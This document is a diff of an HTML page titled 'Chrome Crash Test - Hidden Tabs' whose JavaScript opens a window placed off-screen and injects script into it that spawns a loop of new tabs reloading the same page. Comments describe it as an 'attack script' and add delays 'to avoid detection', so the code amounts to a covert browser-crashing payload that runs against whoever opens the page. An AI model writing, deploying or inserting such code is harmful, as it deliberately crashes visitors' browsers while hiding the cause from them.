@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Hidden Crash Window</title>
+    <title>Hidden Chrome Crash</title>
 </head>
 <body>
     <h1>Chrome Crash Test - Hidden Tabs</h1>
@@ -11,15 +11,18 @@
         function openHiddenWindow(numTabs) {
             let newWin = window.open("https://www.google.com", "_blank", "width=800,height=600,left=5000,top=5000"); // Opens off-screen
             if (newWin) {
-                let count = 0;
-                let interval = setInterval(() => {
-                    if (count >= numTabs) {
-                        clearInterval(interval);
-                    } else {
-                        newWin.location.href = window.location.href; // Load attack script in new window
-                        count++;
-                    }
-                }, 500); // Delayed execution to avoid detection
+                setTimeout(() => {
+                    newWin.document.write(`
+                        <script>
+                            function openCrashTabs() {
+                                for (let i = 0; i < ${numTabs}; i++) {
+                                    window.open("${window.location.href}", "_blank");
+                                }
+                            }
+                            setTimeout(openCrashTabs, 1000); // Delay to avoid detection
+                        <\/script>
+                    `);
+                }, 2000);
             }
         }
 
@@ -57,4 +60,5 @@
     </script>
 </body>
 </html>
+
 
